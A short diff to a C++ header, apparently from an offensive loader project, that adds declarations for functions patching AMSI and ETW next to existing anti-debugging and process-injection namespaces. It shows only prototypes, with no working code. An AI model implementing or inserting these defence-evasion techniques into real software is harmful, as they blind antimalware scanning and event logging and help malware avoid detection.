@@ -16,9 +16,19 @@ typedef BOOL (WINAPI * DLLMAIN)(HINSTANCE, DWORD, LPVOID);
 #define FLG_HEAP_VALIDATE_PARAMETERS 0x40
 #define NT_GLOBAL_FLAG_DEBUGGED (FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS)
 
+namespace Technique::AmsiBypass
+{
+    BOOL PatchAmsi(Procs::PPROCS pProcs);
+}
+
 namespace Technique::AntiDebug
 {
     VOID StopIfDebug(Procs::PPROCS pProcs);
+}
+
+namespace Technique::EtwBypass
+{
+    BOOL PatchEtw(Procs::PPROCS pProcs);
 }
 
 namespace Technique::Injection::Helper
